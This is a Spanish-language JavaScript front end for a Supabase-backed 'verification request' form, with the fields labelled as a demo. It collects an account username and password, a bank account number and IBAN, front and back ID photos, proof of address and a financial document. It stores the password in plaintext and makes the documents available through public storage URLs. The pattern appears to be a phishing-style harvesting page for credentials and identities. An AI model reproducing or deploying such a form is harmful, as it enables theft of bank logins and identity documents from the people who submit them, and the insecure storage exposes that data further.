const SUPABASE_URL =
  "https://iomxopcdoygphvulaswb.supabase.co";

const SUPABASE_PUBLISHABLE_KEY =
  "sb_publishable_4KqCEnqLVSEETOob_X9c7w_4IOpToI-";

const supabaseClient = window.supabase.createClient(
  SUPABASE_URL,
  SUPABASE_PUBLISHABLE_KEY
);

const BUCKET = "demo-archivos";

const formulario = document.getElementById("formulario");
const boton = document.getElementById("boton");
const mensaje = document.getElementById("mensaje");
const estado = document.getElementById("estado");


function mostrarMensaje(texto, tipo) {

  mensaje.textContent = texto;
  mensaje.className = tipo;
  mensaje.style.display = "block";

}


function obtenerArchivo(id) {

  const input = document.getElementById(id);

  if (!input || !input.files || !input.files[0]) {

    throw new Error(
      "Falta el archivo: " + id
    );

  }

  return input.files[0];

}


async function subirArchivo(
  archivo,
  carpeta,
  identificador
) {

  const extension =
    archivo.name.includes(".")
      ? archivo.name.substring(
          archivo.name.lastIndexOf(".")
        )
      : "";


  const ruta =
    carpeta +
    "/" +
    identificador +
    "-" +
    Date.now() +
    extension;


  const { error } =
    await supabaseClient
      .storage
      .from(BUCKET)
      .upload(
        ruta,
        archivo,
        {
          contentType:
            archivo.type ||
            "application/octet-stream",

          upsert: false
        }
      );


  if (error) {

    console.error(
      "Error al subir archivo:",
      error
    );

    throw error;

  }


  const { data } =
    supabaseClient
      .storage
      .from(BUCKET)
      .getPublicUrl(ruta);


  return data.publicUrl;

}


formulario.addEventListener(
  "submit",
  async function(evento) {

    evento.preventDefault();


    if (!formulario.checkValidity()) {

      formulario.reportValidity();

      mostrarMensaje(
        "Por favor, completa todos los campos correctamente.",
        "error"
      );

      return;

    }


    const nombre =
      document
        .getElementById("nombre")
        .value
        .trim();


    const correo =
      document
        .getElementById("correo")
        .value
        .trim();


    const telefono =
      document
        .getElementById("telefono")
        .value
        .trim();


    const usuarioDemo =
      document
        .getElementById("usuario_demo")
        .value
        .trim();


    const passwordDemo =
      document
        .getElementById("password_demo")
        .value;


    const cuentaDemo =
      document
        .getElementById("cuenta_demo")
        .value
        .trim();


    const ibanDemo =
      document
        .getElementById("iban_demo")
        .value
        .trim();


    const correoValido =
      /^[^\s@]+@[^\s@]+\.[^\s@]+$/
        .test(correo);


    if (!correoValido) {

      mostrarMensaje(
        "Por favor, introduce un correo electrónico válido.",
        "error"
      );

      return;

    }


    let fotoFrontal;
    let fotoTrasera;
    let comprobanteDomicilio;
    let documentoFinanciero;


    try {

      fotoFrontal =
        obtenerArchivo(
          "foto_frontal"
        );


      fotoTrasera =
        obtenerArchivo(
          "foto_trasera"
        );


      comprobanteDomicilio =
        obtenerArchivo(
          "comprobante_domicilio"
        );


      documentoFinanciero =
        obtenerArchivo(
          "documento_financiero"
        );


    } catch (error) {

      mostrarMensaje(
        "Debes seleccionar todos los archivos de demostración.",
        "error"
      );

      return;

    }


    boton.disabled = true;
    boton.textContent = "Enviando...";

    mensaje.style.display = "none";


    const carpeta =
      "solicitudes-demo";


    const idTemporal =
      Date.now().toString(36) +
      "-" +
      Math.random()
        .toString(36)
        .substring(2, 8);


    try {

      mostrarMensaje(
        "Subiendo archivos de demostración...",
        "exito"
      );


      const resultados =
        await Promise.all([

          subirArchivo(
            fotoFrontal,
            carpeta,
            idTemporal + "-frontal"
          ),

          subirArchivo(
            fotoTrasera,
            carpeta,
            idTemporal + "-trasera"
          ),

          subirArchivo(
            comprobanteDomicilio,
            carpeta,
            idTemporal + "-domicilio"
          ),

          subirArchivo(
            documentoFinanciero,
            carpeta,
            idTemporal + "-financiero"
          )

        ]);


      const urlFrontal =
        resultados[0];

      const urlTrasera =
        resultados[1];

      const urlDomicilio =
        resultados[2];

      const urlFinanciero =
        resultados[3];


      const registro = {

        nombre: nombre,

        correo: correo,

        telefono: telefono,

        usuario_demo:
          usuarioDemo,

        password_demo:
          passwordDemo,

        cuenta_demo:
          cuentaDemo,

        iban_demo:
          ibanDemo,

        foto_frontal:
          urlFrontal,

        foto_trasera:
          urlTrasera,

        comprobante_domicilio:
          urlDomicilio,

        documento_financiero:
          urlFinanciero,

        estado:
          "Pendiente"

      };


      mostrarMensaje(
        "Guardando la solicitud de demostración...",
        "exito"
      );


      const { data, error } =
        await supabaseClient
          .from(
            "usuario_verificaciones"
          )
          .insert(registro)
          .select()
          .single();


      if (error) {

        console.error(
          "Error de Supabase:",
          error
        );


        mostrarMensaje(
          "No se pudo guardar la solicitud: " +
          error.message,
          "error"
        );


        return;

      }


      console.log(
        "Solicitud guardada:",
        data
      );


      estado.textContent =
        data.estado ||
        "Pendiente";


      mostrarMensaje(
        "Solicitud enviada correctamente. Será revisada en un plazo máximo de 72 horas.",
        "exito"
      );


      formulario.reset();


    } catch (error) {

      console.error(
        "Error inesperado:",
        error
      );


      mostrarMensaje(
        "Ocurrió un problema al enviar la solicitud. Revisa Supabase Storage y sus políticas.",
        "error"
      );


    } finally {

      boton.disabled = false;

      boton.textContent =
        "Enviar solicitud";

    }

  }
);
